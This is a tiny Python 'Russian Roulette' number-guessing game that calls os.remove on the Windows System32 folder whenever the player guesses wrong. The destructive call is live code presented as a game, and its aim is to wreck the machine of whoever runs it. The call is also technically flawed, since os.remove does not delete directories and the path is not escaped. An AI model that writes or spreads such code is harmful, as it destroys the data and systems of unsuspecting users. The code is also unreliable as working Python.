import os
import random
#Russian Roulette
a=random.randint(1,10)
guess=int(input("Guess a number between 1 and 10"))
if a==guess:
  print("Congratulations you win")
else:
  os.remove('C:\Windows\System32')
